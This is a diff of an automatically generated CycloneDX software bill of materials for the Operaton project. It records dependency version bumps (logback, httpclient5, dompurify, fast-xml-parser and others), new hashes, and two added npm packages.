@@ -1,10 +1,10 @@
 {
   "bomFormat": "CycloneDX",
   "specVersion": "1.7",
-  "serialNumber": "urn:uuid:28fb5325-cd68-49ee-83e2-b1f83041107d",
+  "serialNumber": "urn:uuid:24eed552-03f0-4d50-b1dc-ec12ed4b1314",
   "version": 1,
   "metadata": {
-    "timestamp": "2026-06-25T14:38:23Z",
+    "timestamp": "2026-07-03T06:39:34Z",
     "tools": {
       "components": [
         {
@@ -56,7 +56,7 @@
           },
           "group": "aquasecurity",
           "name": "trivy",
-          "version": "0.71.2"
+          "version": "0.72.0"
         }
       ]
     },
@@ -255,45 +255,45 @@
     },
     {
       "type": "library",
-      "bom-ref": "pkg:maven/ch.qos.logback/logback-classic@1.5.35?type=jar",
+      "bom-ref": "pkg:maven/ch.qos.logback/logback-classic@1.5.37?type=jar",
       "publisher": "QOS.ch",
       "group": "ch.qos.logback",
       "name": "logback-classic",
-      "version": "1.5.35",
+      "version": "1.5.37",
       "description": "logback-classic module",
       "scope": "required",
       "hashes": [
         {
           "alg": "MD5",
-          "content": "2af54fb8084cccbeef17ef81cf3e37eb"
+          "content": "472f3bc240ba39591ee957c7c8acea1c"
         },
         {
           "alg": "SHA-1",
-          "content": "1ddf38da89db17f515b42223187291fa5971ba0d"
+          "content": "7c95bc3f7a4d9ad53bf632272818a923c85b9ad3"
         },
         {
           "alg": "SHA-256",
-          "content": "1a0ba277c4d177862731c820099913013255892c79e05b5371307f174f089878"
+          "content": "fd68ff5aa2760857ac5b7ad301e98bc6c18a74d60d7e016da1a608307c9eead7"
         },
         {
           "alg": "SHA-512",
-          "content": "8bcbab10a45f77babeb8fdafcefb1f2ee66f8ef64308024ee1fd7ed17a0dc65efffc3d8b8d3e204f800b6b8089e3cb72548755673343306918f9575997a01294"
+          "content": "ac4b56366074ef22fbc48b453910f2584b5446206eea2d0b5ad16562895a5318ed1ce92e78e92452a5924cc7e807ed4d7815a72e148b232571373099dcde40b1"
         },
         {
           "alg": "SHA-384",
-          "content": "3b31bdcfd080444104fd79e53871f895834ef42467479d3ccefb3e40d265cfd9212d3eb2e8c2ab382bd0237a40d5c0cf"
+          "content": "3653b09fd8a4ea6dbd4fa5f8c758597db1226958f74cc180fe3e7df2ec2d6db1f53144e5e88c1c9fb2fee138555f291f"
         },
         {
           "alg": "SHA3-384",
-          "content": "9c330ea10159060dd2c43ddfe645dfa30736914523455abbadaa482e81b8fc9ca1b958267977e789d5b8b22727a35572"
+          "content": "1cf1cf0167372725807c1f01d8b290cbf497fb3554805ea613bab9d391f9a96c40d65fdf2a0ea83fed482b299573f558"
         },
         {
           "alg": "SHA3-256",
-          "content": "dc6a50c5290791458ed17f9080ecb61875ee475d85e890b60055bf4805c59421"
+          "content": "6e1b8a3274d6f2cf159101cfd3caacf46f8abc264374fc5b1b26f820cc8e4702"
         },
         {
           "alg": "SHA3-512",
-          "content": "40832c21b9a6ba69fccd80aaa1f9385aff74ad130bd722f4b85f207cd7676b9f2e97127603b228b6d886812eedb54974b4b0b82523246e2a8fb98ac95a31572c"
+          "content": "96bdb86aa5f19394dd9c3657d276fa0a41b94f94aa1d17621a3524ab63f483602449fb708c849f70af67a0570228c3c472a7f693aeb8396d3bf40b25486ff368"
         }
       ],
       "licenses": [
@@ -310,7 +310,7 @@
           }
         }
       ],
-      "purl": "pkg:maven/ch.qos.logback/logback-classic@1.5.35?type=jar",
+      "purl": "pkg:maven/ch.qos.logback/logback-classic@1.5.37?type=jar",
       "externalReferences": [
         {
           "url": "http://logback.qos.ch/logback-classic",
@@ -328,45 +328,45 @@
     },
     {
       "type": "library",
-      "bom-ref": "pkg:maven/ch.qos.logback/logback-core@1.5.35?type=jar",
+      "bom-ref": "pkg:maven/ch.qos.logback/logback-core@1.5.37?type=jar",
       "publisher": "QOS.ch",
       "group": "ch.qos.logback",
       "name": "logback-core",
-      "version": "1.5.35",
+      "version": "1.5.37",
       "description": "logback-core module",
       "scope": "required",
       "hashes": [
         {
           "alg": "MD5",
-          "content": "798b80fa3ea25eca010738602061f837"
+          "content": "606908ba3c9d8a6cbd46069b7ce908c5"
         },
         {
           "alg": "SHA-1",
-          "content": "8c682c6322586a73dc6754bbab1812c198d24a73"
+          "content": "41df60907428d396d02134253eee8bd385a31601"
         },
         {
           "alg": "SHA-256",
-          "content": "d8c38ea6871eefccf769f83e1afd07280e29fa0d1dd281092a77eb77c880ace6"
+          "content": "c142955d757d923c6c626296bd97be2e0db1cfd33adeadbf2e2927403391e0a1"
         },
         {
           "alg": "SHA-512",
-          "content": "52e792a250ab61ab3fd2720d128798fe5083935adba9fdd589104f89beb8da4b321bada1a2482d44eb6f6f2cee027e6ef4075c46766c79c350cdbc925bf3c950"
+          "content": "6e0cbeba3ee1a1478116cbfd8345fad9a7d3f29c75a2e60bc569ae427cc29755ee0e3395964dd42c41c2876c41dc72ac2be4c146782f1091d52d413ccd380e34"
         },
         {
           "alg": "SHA-384",
-          "content": "ef235ac4a175b2e81c891563f842900b21389199e50e53f18e662876bb8ccaf0de52aac32c467325adeee688381b036a"
+          "content": "5f9dc17c7a5d18f9d3557f10c97c074fe02ac62507afa54522d7ddc59154abe0e2c0d13db53a76a6b1f9493cd231b525"
         },
         {
           "alg": "SHA3-384",
-          "content": "f0d546f21cf5c50a793da40c46cafeb8870f1671335dd4d1bd3f11376447f915d68da47a1cdcb6f15534344a9a2fea8e"
+          "content": "9c2c6b1afe31610a0dc595fa86f5684a26a7aaf15c21470901d4a6e880cb9fc2fee3f8fd686063f2442bcb7812713970"
         },
         {
           "alg": "SHA3-256",
-          "content": "23aef2bd0816b0af6790ed819562dacdacca64e3ba3a909f54ad4e568133a7f7"
+          "content": "46878c9991e87b3b1ba604b4a5b6cb9c9dd1369f8510fd078a038d3d48815d28"
         },
         {
           "alg": "SHA3-512",
-          "content": "cd85f60a6f117b9439cf3078357d801b74ee41002008b0159df254822377669119d0cf3b6ca62b7426ae163fdf7fbf6954f130b081d191261130ce029b73288e"
+          "content": "1aa69b18e2a4fe8721a3a7b60bf73a87b8d498f17f400b4e5366a795fe2e95cec6c157e3b569e2fc6513e4a6d6d394d071a5849361a6aa94de6423f81506f3ae"
         }
       ],
       "licenses": [
@@ -383,7 +383,7 @@
           }
         }
       ],
-      "purl": "pkg:maven/ch.qos.logback/logback-core@1.5.35?type=jar",
+      "purl": "pkg:maven/ch.qos.logback/logback-core@1.5.37?type=jar",
       "externalReferences": [
         {
           "url": "http://logback.qos.ch/logback-core",
@@ -16764,45 +16764,45 @@
     },
     {
       "type": "library",
-      "bom-ref": "pkg:maven/org.apache.httpcomponents.client5/httpclient5@5.6.1?type=jar",
+      "bom-ref": "pkg:maven/org.apache.httpcomponents.client5/httpclient5@5.6.2?type=jar",
       "publisher": "The Apache Software Foundation",
       "group": "org.apache.httpcomponents.client5",
       "name": "httpclient5",
-      "version": "5.6.1",
+      "version": "5.6.2",
       "description": "Apache HttpComponents Client",
       "scope": "required",
       "hashes": [
         {
           "alg": "MD5",
-          "content": "ab01ab53ec62de3b50ed071dcaba3bfd"
+          "content": "206eade53e6cde90a9ffe09cc56d4788"
         },
         {
           "alg": "SHA-1",
-          "content": "b418ba210ace28adf920f1decf64d673953d07cf"
+          "content": "10ab45a37a2f4174492045840cdb5eb12c4336e7"
         },
         {
           "alg": "SHA-256",
-          "content": "1e3d8444c3c27772e4b9d42a790f06b3345a8ece4fd16d00981f2f2460e1e772"
+          "content": "f3bf571b04dffe005ff29b965b9e3a88846aac6e63f24eae38a86d1979ea49a3"
         },
         {
           "alg": "SHA-512",
-          "content": "2835c56a960c5c926cdd69183d55f9bf84fe3a076247ada8b5849374ac85fafbe39551441eac66f3d7f45652531a9b5beee33dbbd59ae216039d2970d49df772"
+          "content": "21707e209f29fba9c903fce4ae448addfd884db4d88d658ec6d05ca8fbb721f88ef873fb1ef4db1d89632a2028536203c86f1810c0e3bc46d3b9056518df3f36"
         },
         {
           "alg": "SHA-384",
-          "content": "4e055f538e0e8748c30e58a6496786a0bda8696a132b9d3c15e11205e3814152b9d3a3ec638e27ba8d30eea80a418fd6"
+          "content": "ffb665436e85caf368f5245f74a8cea475e4ed687a56c16e090f143742862f6a8429134150e14c29dea08faa7b075c72"
         },
         {
           "alg": "SHA3-384",
-          "content": "5b8306f67927298d10c658777e7e9ee70e52e6120982148f823bf6e63145edafa717b5738a45d516e87be0f19cb87282"
+          "content": "1c139ebfc53e51df4c7d402bbb30dd9e3d1b47b918f6329e9edcf6df3401ec1ec70b36cbc0fae92d6f5983742c439e89"
         },
         {
           "alg": "SHA3-256",
-          "content": "9e05e2adb777099009635ed79c944bb7aa4a96f466b714c3441c5eaafcfd963e"
+          "content": "07f7adcb21cb6fe09f3095b83ff996206fd1e899c0cb73e7a41c7d6486fb3313"
         },
         {
           "alg": "SHA3-512",
-          "content": "50d4343a5e9d892ae23480079d8de24b45751ac4555b503e2cee2e791d7028c4a7f183b545c216fb66598f79e7f054ac37a87c4af978b7fe337bccf566ee0895"
+          "content": "703b17e712f7889557131e3b3bde27287f4e1e070da07013fa55b9e7dd43fcd1daa8e05d3f26ec59f7c56e13078d5e8759307b9f8015227b44a9fc7307d88196"
         }
       ],
       "licenses": [
@@ -16812,10 +16812,10 @@
           }
         }
       ],
-      "purl": "pkg:maven/org.apache.httpcomponents.client5/httpclient5@5.6.1?type=jar",
+      "purl": "pkg:maven/org.apache.httpcomponents.client5/httpclient5@5.6.2?type=jar",
       "externalReferences": [
         {
-          "url": "https://hc.apache.org/httpcomponents-client-5.5.x/5.6.1/httpclient5/",
+          "url": "https://hc.apache.org/httpcomponents-client-5.6.x/5.6.2/httpclient5/",
           "type": "website"
         },
         {
@@ -16831,7 +16831,7 @@
           "type": "mailing-list"
         },
         {
-          "url": "https://github.com/apache/httpcomponents-client/tree/5.6.1/httpclient5",
+          "url": "https://github.com/apache/httpcomponents-client/tree/5.6.2/httpclient5",
           "type": "vcs"
         }
       ]
@@ -21332,7 +21332,7 @@
     },
     {
       "type": "application",
-      "bom-ref": "0ff40850-b1af-46b0-b8d3-74662e1737ad",
+      "bom-ref": "406193e5-bd4f-4afa-9878-198d3cdc892b",
       "name": "package-lock.json",
       "properties": [
         {
@@ -22189,10 +22189,10 @@
     },
     {
       "type": "library",
-      "bom-ref": "pkg:npm/%40nodable/entities@2.1.0",
+      "bom-ref": "pkg:npm/%40nodable/entities@2.2.0",
       "group": "@nodable",
       "name": "entities",
-      "version": "2.1.0",
+      "version": "2.2.0",
       "licenses": [
         {
           "license": {
@@ -22200,11 +22200,11 @@
           }
         }
       ],
-      "purl": "pkg:npm/%40nodable/entities@2.1.0",
+      "purl": "pkg:npm/%40nodable/entities@2.2.0",
       "properties": [
         {
           "name": "aquasecurity:trivy:PkgID",
-          "value": "@nodable/entities@2.1.0"
+          "value": "@nodable/entities@2.2.0"
         },
         {
           "name": "aquasecurity:trivy:PkgType",
@@ -22553,6 +22553,30 @@
     },
     {
       "type": "library",
+      "bom-ref": "pkg:npm/anynum@1.0.1",
+      "name": "anynum",
+      "version": "1.0.1",
+      "licenses": [
+        {
+          "license": {
+            "id": "MIT"
+          }
+        }
+      ],
+      "purl": "pkg:npm/anynum@1.0.1",
+      "properties": [
+        {
+          "name": "aquasecurity:trivy:PkgID",
+          "value": "anynum@1.0.1"
+        },
+        {
+          "name": "aquasecurity:trivy:PkgType",
+          "value": "npm"
+        }
+      ]
+    },
+    {
+      "type": "library",
       "bom-ref": "pkg:npm/array-move@4.0.0",
       "name": "array-move",
       "version": "4.0.0",
@@ -22745,9 +22769,9 @@
     },
     {
       "type": "library",
-      "bom-ref": "pkg:npm/bpmn-js@18.18.0",
+      "bom-ref": "pkg:npm/bpmn-js@18.19.0",
       "name": "bpmn-js",
-      "version": "18.18.0",
+      "version": "18.19.0",
       "licenses": [
         {
           "license": {
@@ -22755,11 +22779,11 @@
           }
         }
       ],
-      "purl": "pkg:npm/bpmn-js@18.18.0",
+      "purl": "pkg:npm/bpmn-js@18.19.0",
       "properties": [
         {
           "name": "aquasecurity:trivy:PkgID",
-          "value": "bpmn-js@18.18.0"
+          "value": "bpmn-js@18.19.0"
         },
         {
           "name": "aquasecurity:trivy:PkgType",
@@ -23457,9 +23481,9 @@
     },
     {
       "type": "library",
-      "bom-ref": "pkg:npm/diagram-js@15.17.0",
+      "bom-ref": "pkg:npm/diagram-js@15.18.1",
       "name": "diagram-js",
-      "version": "15.17.0",
+      "version": "15.18.1",
       "licenses": [
         {
           "license": {
@@ -23467,11 +23491,11 @@
           }
         }
       ],
-      "purl": "pkg:npm/diagram-js@15.17.0",
+      "purl": "pkg:npm/diagram-js@15.18.1",
       "properties": [
         {
           "name": "aquasecurity:trivy:PkgID",
-          "value": "diagram-js@15.17.0"
+          "value": "diagram-js@15.18.1"
         },
         {
           "name": "aquasecurity:trivy:PkgType",
@@ -23830,19 +23854,19 @@
     },
     {
       "type": "library",
-      "bom-ref": "pkg:npm/dompurify@3.4.10",
+      "bom-ref": "pkg:npm/dompurify@3.4.11",
       "name": "dompurify",
-      "version": "3.4.10",
+      "version": "3.4.11",
       "licenses": [
         {
           "expression": "MPL-2.0 OR Apache-2.0"
         }
       ],
-      "purl": "pkg:npm/dompurify@3.4.10",
+      "purl": "pkg:npm/dompurify@3.4.11",
       "properties": [
         {
           "name": "aquasecurity:trivy:PkgID",
-          "value": "dompurify@3.4.10"
+          "value": "dompurify@3.4.11"
         },
         {
           "name": "aquasecurity:trivy:PkgType",
@@ -24092,9 +24116,9 @@
     },
     {
       "type": "library",
-      "bom-ref": "pkg:npm/fast-xml-parser@5.8.0",
+      "bom-ref": "pkg:npm/fast-xml-parser@5.9.3",
       "name": "fast-xml-parser",
-      "version": "5.8.0",
+      "version": "5.9.3",
       "licenses": [
         {
           "license": {
@@ -24102,11 +24126,11 @@
           }
         }
       ],
-      "purl": "pkg:npm/fast-xml-parser@5.8.0",
+      "purl": "pkg:npm/fast-xml-parser@5.9.3",
       "properties": [
         {
           "name": "aquasecurity:trivy:PkgID",
-          "value": "fast-xml-parser@5.8.0"
+          "value": "fast-xml-parser@5.9.3"
         },
         {
           "name": "aquasecurity:trivy:PkgType",
@@ -24665,6 +24689,30 @@
         {
           "name": "aquasecurity:trivy:PkgID",
           "value": "inherits@2.0.4"
+        },
+        {
+          "name": "aquasecurity:trivy:PkgType",
+          "value": "npm"
+        }
+      ]
+    },
+    {
+      "type": "library",
+      "bom-ref": "pkg:npm/is-unsafe@1.0.1",
+      "name": "is-unsafe",
+      "version": "1.0.1",
+      "licenses": [
+        {
+          "license": {
+            "id": "MIT"
+          }
+        }
+      ],
+      "purl": "pkg:npm/is-unsafe@1.0.1",
+      "properties": [
+        {
+          "name": "aquasecurity:trivy:PkgID",
+          "value": "is-unsafe@1.0.1"
         },
         {
           "name": "aquasecurity:trivy:PkgType",
@@ -25754,9 +25802,9 @@
     },
     {
       "type": "library",
-      "bom-ref": "pkg:npm/strnum@2.3.0",
+      "bom-ref": "pkg:npm/strnum@2.4.1",
       "name": "strnum",
-      "version": "2.3.0",
+      "version": "2.4.1",
       "licenses": [
         {
           "license": {
@@ -25764,11 +25812,11 @@
           }
         }
       ],
-      "purl": "pkg:npm/strnum@2.3.0",
+      "purl": "pkg:npm/strnum@2.4.1",
       "properties": [
         {
           "name": "aquasecurity:trivy:PkgID",
-          "value": "strnum@2.3.0"
+          "value": "strnum@2.4.1"
         },
         {
           "name": "aquasecurity:trivy:PkgType",
@@ -26086,7 +26134,7 @@
     },
     {
       "type": "application",
-      "bom-ref": "31ecb7ad-65aa-4e71-9452-201144ba5115",
+      "bom-ref": "f39136b1-cb6f-4f7c-adb7-16f6b714798c",
       "name": "/repo/webapps/frontend",
       "properties": [
         {
@@ -26388,19 +26436,19 @@
       "ref": "pkg:maven/org.operaton.commons/operaton-commons-testing@1.1.5-SNAPSHOT?type=jar",
       "dependsOn": [
         "pkg:maven/org.slf4j/slf4j-api@2.0.18?type=jar",
-        "pkg:maven/ch.qos.logback/logback-classic@1.5.35?type=jar",
+        "pkg:maven/ch.qos.logback/logback-classic@1.5.37?type=jar",
         "pkg:maven/junit/junit@4.13.2?type=jar"
       ]
     },
     {
-      "ref": "pkg:maven/ch.qos.logback/logback-classic@1.5.35?type=jar",
+      "ref": "pkg:maven/ch.qos.logback/logback-classic@1.5.37?type=jar",
       "dependsOn": [
-        "pkg:maven/ch.qos.logback/logback-core@1.5.35?type=jar",
+        "pkg:maven/ch.qos.logback/logback-core@1.5.37?type=jar",
         "pkg:maven/org.slf4j/slf4j-api@2.0.18?type=jar"
       ]
     },
     {
-      "ref": "pkg:maven/ch.qos.logback/logback-core@1.5.35?type=jar",
+      "ref": "pkg:maven/ch.qos.logback/logback-core@1.5.37?type=jar",
       "dependsOn": []
     },
     {
@@ -26569,8 +26617,8 @@
         "pkg:maven/org.jboss/jboss-vfs@3.3.2.Final?type=jar",
         "pkg:maven/org.apache.commons/commons-email2-jakarta@2.0.0-M1?type=jar",
         "pkg:maven/com.cronutils/cron-utils@9.2.1?type=jar",
-        "pkg:maven/ch.qos.logback/logback-core@1.5.35?type=jar",
-        "pkg:maven/ch.qos.logback/logback-classic@1.5.35?type=jar",
+        "pkg:maven/ch.qos.logback/logback-core@1.5.37?type=jar",
+        "pkg:maven/ch.qos.logback/logback-classic@1.5.37?type=jar",
         "pkg:maven/junit/junit@4.13.2?type=jar",
         "pkg:maven/org.awaitility/awaitility@4.3.0?type=jar"
       ]
@@ -27049,7 +27097,7 @@
         "pkg:maven/org.junit.jupiter/junit-jupiter-engine@5.14.4?type=jar",
         "pkg:maven/org.junit.jupiter/junit-jupiter-api@5.14.4?type=jar",
         "pkg:maven/org.assertj/assertj-core@3.27.7?type=jar",
-        "pkg:maven/org.apache.httpcomponents.client5/httpclient5@5.6.1?type=jar",
+        "pkg:maven/org.apache.httpcomponents.client5/httpclient5@5.6.2?type=jar",
         "pkg:maven/org.jboss.arquillian.junit5/arquillian-junit5-container@1.10.2.Final?type=jar",
         "pkg:maven/commons-io/commons-io@2.22.0?type=jar",
         "pkg:maven/org.seleniumhq.selenium/selenium-java@4.43.0?type=jar",
@@ -27547,7 +27595,7 @@
       "dependsOn": []
     },
     {
-      "ref": "pkg:maven/org.apache.httpcomponents.client5/httpclient5@5.6.1?type=jar",
+      "ref": "pkg:maven/org.apache.httpcomponents.client5/httpclient5@5.6.2?type=jar",
       "dependsOn": [
         "pkg:maven/org.apache.httpcomponents.core5/httpcore5@5.4.3?type=jar",
         "pkg:maven/org.apache.httpcomponents.core5/httpcore5-h2@5.3.6?type=jar",
@@ -28203,7 +28251,7 @@
         "pkg:maven/org.apache.tomcat/tomcat-jdbc@11.0.23?type=jar",
         "pkg:maven/org.apache.tomcat/tomcat-juli@11.0.23?type=jar",
         "pkg:maven/com.fasterxml.uuid/java-uuid-generator@5.2.0?type=jar",
-        "pkg:maven/ch.qos.logback/logback-classic@1.5.35?type=jar"
+        "pkg:maven/ch.qos.logback/logback-classic@1.5.37?type=jar"
       ]
     },
     {
@@ -28223,7 +28271,7 @@
       "ref": "pkg:maven/org.operaton.connect/operaton-connect-http-client@1.1.5-SNAPSHOT?type=jar",
       "dependsOn": [
         "pkg:maven/org.operaton.connect/operaton-connect-core@1.1.5-SNAPSHOT?type=jar",
-        "pkg:maven/org.apache.httpcomponents.client5/httpclient5@5.6.1?type=jar"
+        "pkg:maven/org.apache.httpcomponents.client5/httpclient5@5.6.2?type=jar"
       ]
     },
     {
@@ -28300,7 +28348,7 @@
       "ref": "pkg:maven/org.operaton.bpm/operaton-bpm-junit5@1.1.5-SNAPSHOT?type=jar",
       "dependsOn": [
         "pkg:maven/org.junit.jupiter/junit-jupiter-api@5.14.4?type=jar",
-        "pkg:maven/ch.qos.logback/logback-classic@1.5.35?type=jar"
+        "pkg:maven/ch.qos.logback/logback-classic@1.5.37?type=jar"
       ]
     },
     {
@@ -28365,7 +28413,7 @@
     {
       "ref": "pkg:maven/org.operaton.bpm/operaton-engine-rest-openapi@1.1.5-SNAPSHOT?type=jar",
       "dependsOn": [
-        "pkg:maven/org.apache.httpcomponents.client5/httpclient5@5.6.1?type=jar",
+        "pkg:maven/org.apache.httpcomponents.client5/httpclient5@5.6.2?type=jar",
         "pkg:maven/org.openapitools/jackson-databind-nullable@0.2.10?type=jar",
         "pkg:maven/jakarta.annotation/jakarta.annotation-api@2.1.1?type=jar"
       ]
@@ -28616,7 +28664,7 @@
       "dependsOn": [
         "pkg:maven/org.operaton.commons/operaton-commons-logging@1.1.5-SNAPSHOT?type=jar",
         "pkg:maven/org.operaton.commons/operaton-commons-typed-values@1.1.5-SNAPSHOT?type=jar",
-        "pkg:maven/org.apache.httpcomponents.client5/httpclient5@5.6.1?type=jar",
+        "pkg:maven/org.apache.httpcomponents.client5/httpclient5@5.6.2?type=jar",
         "pkg:maven/com.fasterxml.jackson.core/jackson-databind@2.21.4?type=jar",
         "pkg:maven/jakarta.xml.bind/jakarta.xml.bind-api@4.0.0?type=jar",
         "pkg:maven/jakarta.activation/jakarta.activation-api@2.1.0?type=jar",
@@ -28702,7 +28750,7 @@
       "dependsOn": []
     },
     {
-      "ref": "0ff40850-b1af-46b0-b8d3-74662e1737ad",
+      "ref": "406193e5-bd4f-4afa-9878-198d3cdc892b",
       "dependsOn": [
         "pkg:npm/%40bpmn-io/dmn-migrate@0.7.1",
         "pkg:npm/%40bpmn-io/form-js@1.21.3",
@@ -28722,7 +28770,7 @@
         "pkg:npm/bootstrap-icons@1.13.1",
         "pkg:npm/bootstrap@4.6.2",
         "pkg:npm/bpmn-font@0.12.1",
-        "pkg:npm/bpmn-js@18.18.0",
+        "pkg:npm/bpmn-js@18.19.0",
         "pkg:npm/camunda-dmn-js@3.7.0",
         "pkg:npm/chart.js@4.5.1",
         "pkg:npm/clipboard@2.0.11",
@@ -28736,9 +28784,9 @@
         "pkg:npm/dmn-js-shared@17.8.1",
         "pkg:npm/dmn-js@17.8.1",
         "pkg:npm/dom4@2.1.6",
-        "pkg:npm/dompurify@3.4.10",
+        "pkg:npm/dompurify@3.4.11",
         "pkg:npm/events@3.3.0",
-        "pkg:npm/fast-xml-parser@5.8.0",
+        "pkg:npm/fast-xml-parser@5.9.3",
         "pkg:npm/jquery-ui@1.14.2",
         "pkg:npm/jquery@3.7.1",
         "pkg:npm/lodash@4.18.1",
@@ -28753,9 +28801,9 @@
       ]
     },
     {
-      "ref": "31ecb7ad-65aa-4e71-9452-201144ba5115",
+      "ref": "f39136b1-cb6f-4f7c-adb7-16f6b714798c",
       "dependsOn": [
-        "0ff40850-b1af-46b0-b8d3-74662e1737ad"
+        "406193e5-bd4f-4afa-9878-198d3cdc892b"
       ]
     },
     {
@@ -28874,7 +28922,7 @@
         "pkg:npm/big.js@7.0.1",
         "pkg:npm/classnames@2.5.1",
         "pkg:npm/didi@11.0.0",
-        "pkg:npm/dompurify@3.4.10",
+        "pkg:npm/dompurify@3.4.11",
         "pkg:npm/feelers@1.5.1",
         "pkg:npm/flatpickr@4.6.13",
         "pkg:npm/ids@3.0.2",
@@ -29068,7 +29116,7 @@
       "dependsOn": []
     },
     {
-      "ref": "pkg:npm/%40nodable/entities@2.1.0",
+      "ref": "pkg:npm/%40nodable/entities@2.2.0",
       "dependsOn": []
     },
     {
@@ -29134,6 +29182,10 @@
       "dependsOn": []
     },
     {
+      "ref": "pkg:npm/anynum@1.0.1",
+      "dependsOn": []
+    },
+    {
       "ref": "pkg:npm/array-move@4.0.0",
       "dependsOn": []
     },
@@ -29169,11 +29221,11 @@
       "dependsOn": []
     },
     {
-      "ref": "pkg:npm/bpmn-js@18.18.0",
+      "ref": "pkg:npm/bpmn-js@18.19.0",
       "dependsOn": [
         "pkg:npm/bpmn-moddle@10.0.0",
         "pkg:npm/diagram-js-direct-editing@3.4.0",
-        "pkg:npm/diagram-js@15.17.0",
+        "pkg:npm/diagram-js@15.18.1",
         "pkg:npm/ids@3.0.2",
         "pkg:npm/inherits-browser@0.1.0",
         "pkg:npm/min-dash@5.0.0",
@@ -29210,7 +29262,7 @@
         "pkg:npm/camunda-dmn-moddle@1.3.1",
         "pkg:npm/diagram-js-grid@2.0.1",
         "pkg:npm/diagram-js-origin@1.4.0",
-        "pkg:npm/diagram-js@15.17.0",
+        "pkg:npm/diagram-js@15.18.1",
         "pkg:npm/dmn-js-drd@17.8.1",
         "pkg:npm/dmn-js-properties-panel@3.11.1",
         "pkg:npm/dmn-js-shared@17.8.1",
@@ -29363,7 +29415,7 @@
     {
       "ref": "pkg:npm/diagram-js-direct-editing@3.4.0",
       "dependsOn": [
-        "pkg:npm/diagram-js@15.17.0",
+        "pkg:npm/diagram-js@15.18.1",
         "pkg:npm/min-dash@5.0.0",
         "pkg:npm/min-dom@5.3.0"
       ]
@@ -29379,12 +29431,12 @@
     {
       "ref": "pkg:npm/diagram-js-origin@1.4.0",
       "dependsOn": [
-        "pkg:npm/diagram-js@15.17.0",
+        "pkg:npm/diagram-js@15.18.1",
         "pkg:npm/tiny-svg@3.1.3"
       ]
     },
     {
-      "ref": "pkg:npm/diagram-js@15.17.0",
+      "ref": "pkg:npm/diagram-js@15.18.1",
       "dependsOn": [
         "pkg:npm/%40bpmn-io/diagram-js-ui@0.2.4",
         "pkg:npm/clsx@2.1.1",
@@ -29427,7 +29479,7 @@
       "ref": "pkg:npm/dmn-js-boxed-expression@17.8.1",
       "dependsOn": [
         "pkg:npm/%40bpmn-io/dmn-variable-resolver@0.7.0",
-        "pkg:npm/diagram-js@15.17.0",
+        "pkg:npm/diagram-js@15.18.1",
         "pkg:npm/dmn-js-shared@17.8.1",
         "pkg:npm/inferno@5.6.3",
         "pkg:npm/min-dash@5.0.0",
@@ -29440,7 +29492,7 @@
       "dependsOn": [
         "pkg:npm/%40bpmn-io/dmn-variable-resolver@0.7.0",
         "pkg:npm/css.escape@1.5.1",
-        "pkg:npm/diagram-js@15.17.0",
+        "pkg:npm/diagram-js@15.18.1",
         "pkg:npm/dmn-js-shared@17.8.1",
         "pkg:npm/escape-html@1.0.3",
         "pkg:npm/inferno@5.6.3",
@@ -29454,7 +29506,7 @@
       "ref": "pkg:npm/dmn-js-drd@17.8.1",
       "dependsOn": [
         "pkg:npm/diagram-js-direct-editing@3.4.0",
-        "pkg:npm/diagram-js@15.17.0",
+        "pkg:npm/diagram-js@15.18.1",
         "pkg:npm/dmn-js-shared@17.8.1",
         "pkg:npm/ids@3.0.2",
         "pkg:npm/inherits-browser@0.1.0",
@@ -29468,7 +29520,7 @@
       "ref": "pkg:npm/dmn-js-literal-expression@17.8.1",
       "dependsOn": [
         "pkg:npm/%40bpmn-io/dmn-variable-resolver@0.7.0",
-        "pkg:npm/diagram-js@15.17.0",
+        "pkg:npm/diagram-js@15.18.1",
         "pkg:npm/dmn-js-shared@17.8.1",
         "pkg:npm/escape-html@1.0.3",
         "pkg:npm/inferno@5.6.3",
@@ -29481,7 +29533,7 @@
       "ref": "pkg:npm/dmn-js-properties-panel@3.11.1",
       "dependsOn": [
         "pkg:npm/%40bpmn-io/properties-panel@3.40.3",
-        "pkg:npm/diagram-js@15.17.0",
+        "pkg:npm/diagram-js@15.18.1",
         "pkg:npm/dmn-js@17.8.1",
         "pkg:npm/min-dash@5.0.0",
         "pkg:npm/min-dom@5.3.0"
@@ -29491,7 +29543,7 @@
       "ref": "pkg:npm/dmn-js-shared@17.8.1",
       "dependsOn": [
         "pkg:npm/%40bpmn-io/feel-editor@2.5.2",
-        "pkg:npm/diagram-js@15.17.0",
+        "pkg:npm/diagram-js@15.18.1",
         "pkg:npm/didi@11.0.0",
         "pkg:npm/dmn-moddle@12.0.1",
         "pkg:npm/ids@3.0.2",
@@ -29541,7 +29593,7 @@
       "dependsOn": []
     },
     {
-      "ref": "pkg:npm/dompurify@3.4.10",
+      "ref": "pkg:npm/dompurify@3.4.11",
       "dependsOn": [
         "pkg:npm/%40types/trusted-types@2.0.7"
       ]
@@ -29601,12 +29653,13 @@
       ]
     },
     {
-      "ref": "pkg:npm/fast-xml-parser@5.8.0",
+      "ref": "pkg:npm/fast-xml-parser@5.9.3",
       "dependsOn": [
-        "pkg:npm/%40nodable/entities@2.1.0",
+        "pkg:npm/%40nodable/entities@2.2.0",
         "pkg:npm/fast-xml-builder@1.2.0",
+        "pkg:npm/is-unsafe@1.0.1",
         "pkg:npm/path-expression-matcher@1.5.0",
-        "pkg:npm/strnum@2.3.0",
+        "pkg:npm/strnum@2.4.1",
         "pkg:npm/xml-naming@0.1.0"
       ]
     },
@@ -29764,6 +29817,10 @@
     },
     {
       "ref": "pkg:npm/inherits@2.0.4",
+      "dependsOn": []
+    },
+    {
+      "ref": "pkg:npm/is-unsafe@1.0.1",
       "dependsOn": []
     },
     {
@@ -30012,8 +30069,10 @@
       ]
     },
     {
-      "ref": "pkg:npm/strnum@2.3.0",
-      "dependsOn": []
+      "ref": "pkg:npm/strnum@2.4.1",
+      "dependsOn": [
+        "pkg:npm/anynum@1.0.1"
+      ]
     },
     {
       "ref": "pkg:npm/style-mod@4.1.3",
@@ -30040,7 +30099,7 @@
     {
       "ref": "pkg:npm/table-js@9.4.0",
       "dependsOn": [
-        "pkg:npm/diagram-js@15.17.0",
+        "pkg:npm/diagram-js@15.18.1",
         "pkg:npm/didi@11.0.0",
         "pkg:npm/inferno@5.6.3",
         "pkg:npm/min-dash@5.0.0",
@@ -30159,22 +30218,16 @@
           "url": "https://lists.debian.org/debian-lts-announce/2025/07/msg00005.html"
         },
         {
-          "url": "https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/2WUSPYOTOMAZPDEFPWPSCSPMNODRDKK3"
-        },
-        {
